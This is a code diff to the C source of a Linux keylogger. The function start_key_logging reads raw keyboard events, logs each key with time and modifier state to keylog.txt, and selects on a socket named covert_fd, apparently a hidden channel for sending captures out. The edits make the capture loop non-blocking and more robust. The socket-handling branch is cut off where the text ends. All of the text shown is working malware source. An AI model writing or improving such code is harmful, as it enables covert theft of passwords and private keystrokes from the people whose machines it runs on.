@@ -152,20 +152,25 @@ void start_key_logging(int keyboard_fd, struct Context *ctx, struct List *list) 
     ssize_t n;
     fd_set readfds;
     struct timeval tv;
-    int ret;
     int maxfd;
+    int running = 1;
 
     int sock_fd = ctx->covert_fd;
+
     log_file = fopen("keylog.txt", "w");
     if (!log_file) return;
 
     fprintf(log_file, "RelTime         Type       Code                 Value          Modifiers\n");
     fflush(log_file);
 
+    modifiers = (modifier_state_t){0,0,0,0,0};
+    start_time_valid = 0;
+
+    fcntl(keyboard_fd, F_SETFL, O_NONBLOCK);
+
     maxfd = keyboard_fd;
     if (sock_fd >= 0 && sock_fd > maxfd) maxfd = sock_fd;
 
-    int running = 1;
     while (running) {
         FD_ZERO(&readfds);
         FD_SET(keyboard_fd, &readfds);
@@ -174,17 +179,19 @@ void start_key_logging(int keyboard_fd, struct Context *ctx, struct List *list) 
         tv.tv_sec = 0;
         tv.tv_usec = 100000;
 
-        ret = select(maxfd + 1, &readfds, NULL, NULL, &tv);
-        if (ret < 0) { if (errno == EINTR) continue; break; }
-        if (ret == 0) continue;
+        int ret = select(maxfd + 1, &readfds, NULL, NULL, &tv);
+        if (ret < 0) {
+            if (errno == EINTR) continue;
+            perror("select error");
+            break;
+        }
 
         if (FD_ISSET(keyboard_fd, &readfds)) {
-            printf("keyboard fd is set\n");
-            n = read(keyboard_fd, &ev, sizeof(ev));
-            if (n <= 0) continue;
+            while ((n = read(keyboard_fd, &ev, sizeof(ev))) > 0) {
+                if (n != sizeof(ev)) continue;
+                if (ev.type != EV_KEY) continue;
 
-            if (ev.type == EV_KEY) {
-                printf("key type: %d\n", ev.type);
+                printf("\nkey event detected\n");
                 char code_buf[32];
                 print_relative_time(&ev.time);
                 fprintf(log_file, " %-10s %-20s %-15s",
@@ -197,6 +204,7 @@ void start_key_logging(int keyboard_fd, struct Context *ctx, struct List *list) 
 
                 update_modifiers(ev.code, ev.value);
             }
+            if (n < 0 && errno != EAGAIN) perror("keyboard read");
         }
 
         if (sock_fd >= 0 && FD_ISSET(sock_fd, &readfds)) {
